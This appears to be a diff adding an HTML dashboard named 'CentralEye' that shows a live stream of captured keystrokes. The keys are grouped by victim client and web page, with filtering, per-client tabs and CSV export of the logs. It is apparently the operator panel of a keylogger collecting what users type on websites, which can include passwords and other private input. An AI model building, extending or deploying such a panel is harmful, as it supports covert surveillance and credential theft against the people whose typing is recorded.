@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>CentralEye — Live Activity</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    :root{--bg:#040506;--bg-alt:#05070b;--text:#e5e5e5;--text-muted:#7f8c8d;--border:#151822;--accent:#26ff80;--accent-soft:#0b3b23;--pill-bg:#0f1722;--pill-border:#1f2937;--shadow-dot:0 0 10px #26ff80}
+    body.light{--bg:#f4f5f8;--bg-alt:#fff;--text:#111827;--text-muted:#4b5563;--border:#d1d5db;--accent:#16a34a;--accent-soft:#bbf7d0;--pill-bg:#e5e7eb;--pill-border:#cbd5f5;--shadow-dot:0 0 4px #16a34a}
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{background:radial-gradient(circle at top left,#071018,#020308,#000);color:var(--text);font-family:"JetBrains Mono",monospace;height:100vh;display:flex;flex-direction:column;overflow:hidden}
+    header{background:rgba(5,7,11,.95);backdrop-filter:blur(8px);padding:14px 20px;border-bottom:1px solid var(--border);position:sticky;top:0;z-index:10}
+    .header-top{display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px}
+    .status{display:flex;align-items:center;gap:12px}
+    .dot{width:14px;height:14px;border-radius:50%;background:var(--accent);box-shadow:var(--shadow-dot);animation:pulse 2s infinite}
+    @keyframes pulse{0%,100%{opacity:1}50%{opacity:.6}}
+    h1{font-size:20px;margin:0;letter-spacing:.08em;text-transform:uppercase}
+    .subtitle{font-size:11px;color:var(--text-muted);margin-top:4px}
+    .controls{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
+    input,button{padding:8px 12px;border-radius:6px;border:1px solid var(--border);background:var(--bg-alt);color:var(--text);font-size:12px;cursor:pointer}
+    input:focus{outline:none;border-color:var(--accent)}
+    button:hover{border-color:var(--accent);color:var(--accent)}
+    #groupToggle{background:var(--accent-soft);border-color:var(--accent);color:#ecfdf5}
+    .badge{padding:4px 10px;border-radius:999px;background:var(--pill-bg);border:1px solid var(--pill-border);font-size:11px}
+    .client-tabs{display:flex;gap:6px;margin-top:8px;flex-wrap:wrap}
+    .client-tab{padding:4px 12px;border-radius:999px;border:1px solid var(--border);background:var(--bg-alt);color:var(--text-muted);font-size:11px;cursor:pointer}
+    .client-tab.active{border-color:var(--accent);background:var(--accent-soft);color:#fff}
+    main{flex:1;overflow:auto;padding:14px 20px}
+    table{width:100%;border-collapse:collapse;font-size:13px}
+    th{background:rgba(5,7,11,.98);position:sticky;top:90px;z-index:5;padding:10px;text-align:left;font-weight:600;color:var(--text-muted);font-size:11px;text-transform:uppercase;letter-spacing:.08em}
+    td{padding:10px;vertical-align:top;border-bottom:1px solid var(--border)}
+    tbody tr:nth-child(even){background:rgba(7,10,16,.9)}
+    /* ←←← NO HOVER HIGHLIGHT ANYMORE ←←← */
+    tbody tr:hover{background:transparent !important}
+    .col-id{width:50px;color:var(--text-muted);font-size:11px}
+    .col-time{width:160px;font-size:11px}
+    .col-client{width:120px;font-size:11px;color:#a5b4fc}
+    .col-url a{color:var(--accent);text-decoration:none;word-break:break-all}
+    .col-url a:hover{text-decoration:underline}
+    .col-keys{white-space:pre-wrap;word-break:break-word;font-family:inherit}
+    .no-logs{padding:60px;text-align:center;color:var(--text-muted);font-size:14px}
+    .footer-note{margin-top:20px;font-size:11px;color:var(--text-muted);text-align:center}
+    .centrali{color:var(--accent);letter-spacing:.2em;margin-top:8px}
+  </style>
+</head>
+<body>
+  <header>
+    <div class="header-top">
+      <div class="status">
+        <div class="dot"></div>
+        <div>
+          <h1>CentralEye</h1>
+          <div class="subtitle">real-time activity • newest on top</div>
+        </div>
+      </div>
+      <div class="controls">
+        <input id="filter" placeholder="Filter by URL, client, keys..." />
+        <button id="groupToggle">Group: ON</button>
+        <button id="themeToggle">Theme: Dark</button>
+        <button id="downloadBtn">CSV</button>
+        <button id="clearBtn">Clear</button>
+        <span class="badge" id="count">0 entries</span>
+      </div>
+    </div>
+    <div class="client-tabs" id="tabs"></div>
+  </header>
+  <main>
+    <table>
+      <thead><tr>
+        <th class="col-id">#</th>
+        <th class="col-time">Time</th>
+        <th class="col-client">Client</th>
+        <th class="col-url">Page</th>
+        <th class="col-keys">Keys</th>
+      </tr></thead>
+      <tbody id="body"><tr><td colspan="5" class="no-logs">Connecting to stream...</td></tr>
+    </tbody>
+    </table>
+    <div class="footer-note">
+      Live updates via SSE • Latest 1000 entries<br/>
+      <div class="centrali">MadeByCentrali</div>
+    </div>
+  </main>
+
+  <script>
+    const logs = [], MAX = 1000;
+    let id = 1, filter = "", group = true, clientFilter = "ALL";
+    const body = document.getElementById("body"), count = document.getElementById("count"), tabs = document.getElementById("tabs");
+
+    const fmt = keys => keys.map(k => k === " " ? " " : (k.match(/^\[(.+)\]$/) ? ` [${k.slice(1,-1).toLowerCase()}] ` : k)).join("");
+
+    function render() {
+      body.innerHTML = "";
+      let list = logs.filter(l => clientFilter === "ALL" || l.client === clientFilter)
+                       .filter(l => !filter || JSON.stringify(l).toLowerCase().includes(filter.toLowerCase()));
+      count.textContent = list.length + " entries";
+
+      if (!list.length) { body.innerHTML = `<tr><td colspan="5" class="no-logs">No matching logs</td></tr>`; return; }
+
+      if (group) {
+        const map = new Map();
+        list.forEach(l => {
+          const key = `${l.url}||${l.client}`;
+          if (!map.has(key)) map.set(key, {url:l.url, client:l.client, keys:[], time:l.time, batches:0});
+          map.get(key).keys.unshift(...l.keys);
+          map.get(key).batches++;
+        });
+        let i = 1;
+        [...map.values()].sort((a,b) => b.time.localeCompare(a.time)).forEach(g => {
+          body.innerHTML += `<tr>
+            <td class="col-id">#${i++}</td>
+            <td class="col-time">${g.time}<br><small>${g.batches} batch${g.batches>1?"es":""}</small></td>
+            <td class="col-client">${g.client}</td>
+            <td class="col-url"><a href="${g.url}" target="_blank">${g.url}</a></td>
+            <td class="col-keys">${fmt(g.keys)}</td>
+          </tr>`;
+        });
+      } else {
+        list.forEach(l => {
+          body.innerHTML += `<tr>
+            <td class="col-id">#${l.id}</td>
+            <td class="col-time">${l.time}</td>
+            <td class="col-client">${l.client}</td>
+            <td class="col-url"><a href="${l.url}" target="_blank">${l.url}</a></td>
+            <td class="col-keys">${fmt(l.keys)}</td>
+          </tr>`;
+        });
+      }
+    }
+
+    function updateTabs() {
+      const clients = new Set(logs.map(l => l.client));
+      tabs.innerHTML = `<button class="client-tab${clientFilter==="ALL"?" active":""}">ALL</button>` +
+        [...clients].sort().map(c => `<button class="client-tab${c===clientFilter?" active":""}">${c}</button>`).join("");
+    }
+
+    let es;
+    function connect() {
+      es = new EventSource("/stream");
+      es.onmessage = e => {
+        try {
+          const d = JSON.parse(e.data);
+          if (d.keys?.length) {
+            logs.unshift({id:id++, url:d.url, client:d.client||"?", keys:d.keys, time:new Date().toISOString().replace("T"," ").slice(0,19)});
+            if (logs.length > MAX) logs.pop();
+            updateTabs();
+            render();
+          }
+        } catch {}
+      };
+      es.onerror = () => { es.close(); setTimeout(connect, 3000); };
+    }
+    connect();
+
+    document.getElementById("filter").oninput = e => { filter = e.target.value; render(); };
+    document.getElementById("groupToggle").onclick = () => { group = !group; this.textContent = "Group: " + (group?"ON":"OFF"); render(); };
+    document.getElementById("themeToggle").onclick = () => { document.body.classList.toggle("light"); this.textContent = "Theme: " + (document.body.classList.contains("light")?"Light":"Dark"); };
+    document.getElementById("clearBtn").onclick = () => { logs.length = 0; id = 1; render(); updateTabs(); };
+    document.getElementById("downloadBtn").onclick = () => {
+      if (!logs.length) return;
+      const csv = "id,time,client,url,keys\n" + logs.map(l => `${l.id},${l.time},${l.client},"${l.url}","${l.keys.join(" ")}"`).join("\n");
+      const a = document.createElement("a");
+      a.href = URL.createObjectURL(new Blob([csv], {type:"text/csv"}));
+      a.download = "centrale_logs_" + new Date().toISOString().slice(0,19).replace(/:/g,"-") + ".csv";
+      a.click();
+    };
+
+    tabs.onclick = e => {
+      const btn = e.target.closest(".client-tab");
+      if (btn) { clientFilter = btn.textContent; updateTabs(); render(); }
+    };
+
+    render();
+  </script>
+</body>
+</html>
